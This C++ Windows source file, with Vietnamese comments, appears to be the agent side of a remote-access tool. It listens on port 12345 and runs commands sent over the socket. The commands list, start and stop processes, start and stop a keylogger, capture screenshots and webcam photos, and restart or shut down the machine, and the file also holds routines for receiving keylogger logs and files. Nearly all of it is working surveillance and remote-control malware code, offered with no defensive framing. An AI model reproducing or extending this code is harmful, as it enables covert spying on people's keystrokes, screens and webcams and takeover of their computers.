#include "../includes/tasks.h"

void receiveResponse(SOCKET clientSock)
{
    char buffer[1024];
    int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0)
    {
        std::cerr << "Failed to receive response from client." << std::endl;
        return;
    }
    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received response: " << buffer << std::endl;
}

void receiveKeyloggerLog(SOCKET sock)
{
    uint32_t len = 0;

    int received = recv(sock, (char*)&len, sizeof(len), 0);
    if (received != sizeof(len))
    {
        std::cerr << "Failed to receive keylogger log length." << std::endl;
        return;
    }
    if (len == 0)
    {
        std::cout << "No keylogger log available." << std::endl;
        return;
    }

    char* buffer = new char[len + 1];
    int total = 0;

    while (total < len)
    {
        int bytes = recv(sock, buffer + total, len - total, 0);
        if (bytes <= 0)
        {
            std::cerr << "Failed to receive keylogger log content." << std::endl;
            delete[] buffer;
            return;
        }
        total += bytes;
    }

    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received keylogger log (" << len << " bytes):" << std::endl;
    std::cout << buffer << std::endl;
    delete[] buffer;
}

void receiveFile(SOCKET sock)
{
    uint32_t nameLen;
    if (recv(sock, reinterpret_cast<char*>(&nameLen), sizeof(nameLen), 0) != sizeof(nameLen))
    {
        std::cerr << "Failed to receive filename length." << std::endl;
        return;
    }
    char* nameBuf = new char[nameLen + 1];
    if (recv(sock, nameBuf, nameLen, 0) != nameLen)
    {
        std::cerr << "Failed to receive filename." << std::endl;
        delete[] nameBuf;
        return;
    }

    nameBuf[nameLen] = '\0'; // Null-terminate the filename
    std::string filename = "received_" + std::string(nameBuf);
    delete[] nameBuf;

    uint32_t fileSize;
    if (recv(sock, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0) != sizeof(fileSize))
    {
        std::cerr << "Failed to receive file size." << std::endl;
        return;
    }
    if (fileSize == 0)
    {
        std::cout << "No file content received." << std::endl;
        return;
    }

    std::ofstream outFile(filename, std::ios::binary);
    if (!outFile.is_open())
    {
        std::cerr << "Failed to open file for writing: " << filename << std::endl;
        return;
    }
    char buffer[4096];
    int received = 0;

    while (received < fileSize)
    {
        int chunk = recv(sock, buffer, std::min((int)sizeof(buffer), (int)(fileSize - received)), 0);
        if (chunk <= 0)
        {
            std::cerr << "Failed to receive file content." << std::endl;
            outFile.close();
            return;
        }
        outFile.write(buffer, chunk);
        received += chunk;
    }
    outFile.close();
    std::cout << "File received and saved as: " << filename << std::endl;
    std::cout << "File content received from client." << std::endl;
}

void handleCommand(SOCKET sock, const std::string& cmd)
{
    if (cmd == "help")
    {
        std::string helpMsg = 
            "Available commands:\n"
            "  help                    - Show this help message\n"
            "  list                    - List all running processes\n"
            "  start <path>            - Start a process from given path\n"
            "  stop <process_name>     - Stop a process by name\n"
            "  start_keylogger         - Start keylogger\n"
            "  stop_keylogger          - Stop keylogger\n"
            "  screenshot <filename>   - Capture screen and save as PNG\n"
            "  webcam_photo <filename> - Capture single webcam photo\n"
            "  restart                 - Restart the system\n"
            "  shutdown                - Shutdown the system\n"
            "  exit                    - Disconnect from server\n";
        send(sock, helpMsg.c_str(), helpMsg.size(), 0);
    }
    else if (cmd == "list")
    {
        std::string processes = listProcesses();
        send(sock, processes.c_str(), processes.size(), 0);
    }
    else if (cmd.rfind("start ", 0) == 0)
    {
        std::string path = cmd.substr(6);
        bool ok = startProcess(path);
        
        std::string msg = ok ? "Process started successfully." : "Failed to start process.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd.rfind("stop ", 0) == 0)
    {
        std::string name = cmd.substr(5);
        bool ok = stopProcess(name);
        std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "start_keylogger")
    {
        startKeylogger();
        std::string msg = "Keylogger started.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "stop_keylogger")
    {
        stopKeylogger();
        std::string msg = "Keylogger stopped.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd.rfind("screenshot ", 0) == 0)
    {
        std::string filename = cmd.substr(11);
        if (filename.empty())
        {
            filename = "screenshot.png";
        }
        // Thêm extension .png nếu chưa có
        if (filename.find(".png") == std::string::npos && 
            filename.find(".PNG") == std::string::npos)
        {
            filename += ".png";
        }
        
        bool success = captureScreen(filename);
        std::string msg = success ? 
            "Screenshot captured successfully: " + filename : 
            "Failed to capture screenshot.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "restart")
    {
        std::string msg = "Initiating system restart...";
        send(sock, msg.c_str(), msg.size(), 0);
        
        // Delay một chút để gửi response trước khi restart
        Sleep(1000);
        
        bool success = restartSystem();
        if (!success)
        {
            std::string errorMsg = "Failed to restart system.";
            send(sock, errorMsg.c_str(), errorMsg.size(), 0);
        }
        // Nếu restart thành công, connection sẽ bị đóng do máy restart
    }
    else if (cmd == "shutdown")
    {
        std::string msg = "Initiating system shutdown...";
        send(sock, msg.c_str(), msg.size(), 0);
        
        // Delay một chút để gửi response trước khi shutdown
        Sleep(1000);
        
        bool success = shutdownSystem();
        if (!success)
        {
            std::string errorMsg = "Failed to shutdown system.";
            send(sock, errorMsg.c_str(), errorMsg.size(), 0);
        }
        // Nếu shutdown thành công, connection sẽ bị đóng do máy tắt
    }
    else if (cmd.rfind("webcam_photo ", 0) == 0)
    {
        std::string filename = cmd.substr(13); // Remove "webcam_photo "
        if (filename.empty())
        {
            filename = "webcam_photo.jpg";
        }
        
        std::string startMsg = "Capturing webcam photo: " + filename + "...";
        send(sock, startMsg.c_str(), startMsg.size(), 0);
        
        bool success = captureWebcamPhoto(filename);
        std::string msg = success ? 
            "Webcam photo captured successfully: " + filename : 
            "Failed to capture webcam photo.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else
    {
        std::string msg = "Unknown command: " + cmd;
        send(sock, msg.c_str(), msg.size(), 0);
    }
}

int main()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }
    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    listen(serverSock, 1);
    std::cout << "Server is listening on port 12345..." << std::endl;

    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    std::cout << "Client connected." << std::endl;

    char buffer[1024];
    while (true)
    {
        // Nhận lệnh từ client
        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) 
        {
            std::cout << "Client disconnected." << std::endl;
            break;
        }

        buffer[len] = '\0';
        std::string cmd(buffer);
        std::cout << "Received command from client: " << cmd << std::endl;
        
        // Xử lý lệnh trên server
        handleCommand(clientSock, cmd);
    }

    closesocket(clientSock);
    closesocket(serverSock);
    WSACleanup();

    return 0;
}